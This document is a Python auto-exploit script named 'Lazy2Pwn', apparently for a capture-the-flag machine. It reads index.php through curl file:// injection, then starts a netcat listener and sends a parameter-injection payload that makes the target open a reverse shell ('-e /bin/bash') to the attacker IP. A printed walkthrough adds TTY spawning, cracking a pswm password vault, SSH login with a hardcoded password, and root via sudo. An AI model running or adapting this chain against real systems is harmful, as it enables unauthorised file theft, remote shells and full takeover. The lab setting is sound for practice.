import requests
from bs4 import BeautifulSoup
import click
import subprocess
import threading
import time
import pyfiglet

def generate_banner(text, font="standard"):
	ascii_banner = pyfiglet.figlet_format(text, font=font)
	print(ascii_banner + "				@Mohamed_Ezzat\n")

def exfil_index(rhost, lhost, lport):
	data = f"url=http://{rhost}+curl+file:///var/www/html/index.php"
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	response = requests.post("http://" + rhost, data = data, headers=headers)

	if response.status_code == 200:
		soup = BeautifulSoup(response.content, "html.parser").get_text()
			
		start_marker = "<?php"
		end_marker = "?>"

		start_index = soup.find(start_marker)
		end_index = soup.find(end_marker, start_index)

		if start_index != -1 and end_index != -1:
			extracted = soup[start_index:end_index + len(end_marker)].strip()

			with open("down_index.php", "w", encoding="utf-8") as f:
				f.write(extracted)

			print("[+] Exfiltrated index.php file and saved to ./down_index.php")
			exploit(rhost, lhost, lport)
		else:
			print("[-] File corupted, try again!")
	else:
		print("[-] Request failed with status code:", response.status_code)
		

def nc_listener(lport):
	print("[+] Starting netcat listener and waiting for the shell...\n")
	subprocess.run(["nc", "-nlvp", str(lport)])

def exploit(rhost, lhost, lport):
	listener_thread = threading.Thread(target=nc_listener, args=(lport,))
	listener_thread.start()
	time.sleep(2)
    
	data = f"ip={lhost}&port={lport}+-e+/bin/bash"
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	requests.post("http://" + rhost + "/index.php?expertmode=tcp", data = data, headers=headers)
	
	listener_thread.join()
	

@click.command()
@click.option('--rhost', prompt='Remote target IP', help='Enter remote target IP')
@click.option('--lhost', prompt='Local attacker IP', help='Enter local attacker IP')
@click.option('--lport', default=4444, help='Enter local listening port')
def main(rhost, lhost, lport):
	aleks_pass = "1uY3w22uc-Wr{xNHR~+E"
	generate_banner("Lazy2Pwn")
	print(f'''
Walkthrough:

  - Foothold:
      1. Exfiltrate index.php file and review the source code.
      2. Do parameter injection via POST parameters.
      3. Run netcat listener and get the shell.
      
  - TTY spawning:
      1. script /dev/null -c /bin/bash
      2. ctrl + z
      3. stty raw -echo; fg
      4. export TERM=xterm
      
  - PrivEsc:
      1. cat /home/aleks/.local/share/pswm/pswm
      2. Download pswm and Decrypt it locally using "https://github.com/seriotonctf/pswm-decryptor".
          python pswm-decrypt.py -f pswm -w /usr/share/wordlists/rockyou.txt
      3. ssh aleks@{rhost} with the dexcrypted password "{aleks_pass}".
      4. sudo -l
      5. sudo -i
      
  - Flags:
      1. User: cat /var/www/html/user_aeT1xa.txt
      2. Root: cat /root/root.txt
	 ''')
	exfil_index(rhost, lhost, lport)
	exploit(rhost, lhost, lport)

if __name__ == '__main__':
	main()
